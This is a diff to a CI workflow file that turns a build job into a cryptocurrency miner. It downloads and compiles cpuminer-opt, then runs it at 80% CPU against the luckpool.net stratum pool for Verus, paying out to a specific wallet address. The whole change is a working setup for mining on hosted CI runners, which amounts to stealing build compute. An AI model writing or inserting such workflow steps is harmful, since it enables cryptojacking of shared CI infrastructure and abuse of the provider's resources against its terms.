@@ -12,16 +12,22 @@ jobs:
     - name: Install dependencies
       run: |
         sudo apt update
-        sudo apt install wget cpulimit -y
+        sudo apt install wget unzip build-essential automake autoconf libtool \
+        pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev cpulimit -y
 
-    - name: Download Verus Miner binary
+    - name: Download cpuminer source (zip)
       run: |
-        wget https://download.verus.io/verus-cli/linux-verus-cli-latest.tar.gz
-        tar -xvf linux-verus-cli-latest.tar.gz
+        wget https://codeload.github.com/JayDDee/cpuminer-opt/zip/refs/heads/master -O miner.zip
+        unzip miner.zip
+        mv cpuminer-opt-master cpuminer
+        cd cpuminer
+        ./build.sh
 
-    - name: Start Mining (80% CPU)
+    - name: Start mining Verus (80% CPU)
       run: |
-        cpulimit -l 80 -- ./verus \
+        cd cpuminer
+        cpulimit -l 80 -- ./cpuminer \
+        -a verus \
         -o stratum+tcp://na.luckpool.net:3956 \
         -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P.worker \
         -p x \
